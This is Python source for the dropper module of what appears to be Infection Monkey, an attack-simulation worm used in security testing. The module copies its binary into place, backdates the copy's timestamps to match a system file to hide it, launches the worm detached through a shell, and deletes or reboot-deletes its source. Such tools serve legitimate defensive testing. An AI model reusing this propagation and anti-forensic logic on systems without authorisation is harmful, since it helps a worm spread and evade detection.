import argparse
import ctypes
import filecmp
import logging
import os
import pprint
import shutil
import subprocess
import sys
import time
from ctypes import c_char_p

from common.utils.attack_utils import ScanStatus, UsageEnum
from infection_monkey.config import WormConfiguration
from infection_monkey.exploit.tools.helpers import \
    build_monkey_commandline_explicitly
from infection_monkey.model import (GENERAL_CMDLINE_LINUX,
                                    MONKEY_CMDLINE_LINUX,
                                    MONKEY_CMDLINE_WINDOWS)
from infection_monkey.system_info import OperatingSystem, SystemInfoCollector
from infection_monkey.telemetry.attack.t1106_telem import T1106Telem

if "win32" == sys.platform:
    from win32process import DETACHED_PROCESS
else:
    DETACHED_PROCESS = 0

# Linux doesn't have WindowsError
try:
    WindowsError
except NameError:
    # noinspection PyShadowingBuiltins
    WindowsError = IOError

__author__ = 'itamar'

LOG = logging.getLogger(__name__)

MOVEFILE_DELAY_UNTIL_REBOOT = 4


class MonkeyDrops(object):
    def __init__(self, args):
        arg_parser = argparse.ArgumentParser()
        arg_parser.add_argument('-p', '--parent')
        arg_parser.add_argument('-t', '--tunnel')
        arg_parser.add_argument('-s', '--server')
        arg_parser.add_argument('-d', '--depth', type=int)
        arg_parser.add_argument('-l', '--location')
        arg_parser.add_argument('-vp', '--vulnerable-port')
        self.monkey_args = args[1:]
        self.opts, _ = arg_parser.parse_known_args(args)

        self._config = {'source_path': os.path.abspath(sys.argv[0]),
                        'destination_path': self.opts.location}

    def initialize(self):
        LOG.debug("Dropper is running with config:\n%s", pprint.pformat(self._config))

    def start(self):
        if self._config['destination_path'] is None:
            LOG.error("No destination path specified")
            return False

        # we copy/move only in case path is different
        try:
            file_moved = filecmp.cmp(self._config['source_path'], self._config['destination_path'])
        except OSError:
            file_moved = False

        if not file_moved and os.path.exists(self._config['destination_path']):
            os.remove(self._config['destination_path'])

        # first try to move the file
        if not file_moved and WormConfiguration.dropper_try_move_first:
            try:
                shutil.move(self._config['source_path'],
                            self._config['destination_path'])

                LOG.info("Moved source file '%s' into '%s'",
                         self._config['source_path'], self._config['destination_path'])

                file_moved = True
            except (WindowsError, IOError, OSError) as exc:
                LOG.debug("Error moving source file '%s' into '%s': %s",
                          self._config['source_path'], self._config['destination_path'],
                          exc)

        # if file still need to change path, copy it
        if not file_moved:
            try:
                shutil.copy(self._config['source_path'],
                            self._config['destination_path'])

                LOG.info("Copied source file '%s' into '%s'",
                         self._config['source_path'], self._config['destination_path'])
            except (WindowsError, IOError, OSError) as exc:
                LOG.error("Error copying source file '%s' into '%s': %s",
                          self._config['source_path'], self._config['destination_path'],
                          exc)

                return False

        if WormConfiguration.dropper_set_date:
            if sys.platform == 'win32':
                dropper_date_reference_path = os.path.expandvars(WormConfiguration.dropper_date_reference_path_windows)
            else:
                dropper_date_reference_path = WormConfiguration.dropper_date_reference_path_linux
            try:
                ref_stat = os.stat(dropper_date_reference_path)
            except OSError:
                LOG.warning("Cannot set reference date using '%s', file not found",
                            dropper_date_reference_path)
            else:
                try:
                    os.utime(self._config['destination_path'],
                             (ref_stat.st_atime, ref_stat.st_mtime))
                except OSError:
                    LOG.warning("Cannot set reference date to destination file")

        monkey_options = \
            build_monkey_commandline_explicitly(parent=self.opts.parent,
                                                tunnel=self.opts.tunnel,
                                                server=self.opts.server,
                                                depth=self.opts.depth,
                                                location=None,
                                                vulnerable_port=self.opts.vulnerable_port)

        if OperatingSystem.Windows == SystemInfoCollector.get_os():
            monkey_cmdline = MONKEY_CMDLINE_WINDOWS % {'monkey_path': self._config['destination_path']} + monkey_options
        else:
            dest_path = self._config['destination_path']
            # In linux we have a more complex commandline. There's a general outer one, and the inner one which actually
            # runs the monkey
            inner_monkey_cmdline = MONKEY_CMDLINE_LINUX % {'monkey_filename': dest_path.split("/")[-1]} + monkey_options
            monkey_cmdline = GENERAL_CMDLINE_LINUX % {'monkey_directory': dest_path[0:dest_path.rfind("/")],
                                                      'monkey_commandline': inner_monkey_cmdline}

        monkey_process = subprocess.Popen(monkey_cmdline, shell=True,
                                          stdin=None, stdout=None, stderr=None,
                                          close_fds=True, creationflags=DETACHED_PROCESS)

        LOG.info("Executed monkey process (PID=%d) with command line: %s",
                 monkey_process.pid, monkey_cmdline)

        time.sleep(3)
        if monkey_process.poll() is not None:
            LOG.warning("Seems like monkey died too soon")

    def cleanup(self):
        try:
            if (self._config['source_path'].lower() != self._config['destination_path'].lower()) and \
                    os.path.exists(self._config['source_path']) and \
                    WormConfiguration.dropper_try_move_first:

                # try removing the file first
                try:
                    os.remove(self._config['source_path'])
                except Exception as exc:
                    LOG.debug("Error removing source file '%s': %s", self._config['source_path'], exc)

                    # mark the file for removal on next boot
                    dropper_source_path_ctypes = c_char_p(self._config['source_path'])
                    if 0 == ctypes.windll.kernel32.MoveFileExA(dropper_source_path_ctypes, None,
                                                               MOVEFILE_DELAY_UNTIL_REBOOT):
                        LOG.debug("Error marking source file '%s' for deletion on next boot (error %d)",
                                  self._config['source_path'], ctypes.windll.kernel32.GetLastError())
                    else:
                        LOG.debug("Dropper source file '%s' is marked for deletion on next boot",
                                  self._config['source_path'])
                        T1106Telem(ScanStatus.USED, UsageEnum.DROPPER_WINAPI).send()
        except AttributeError:
            LOG.error("Invalid configuration options. Failing")
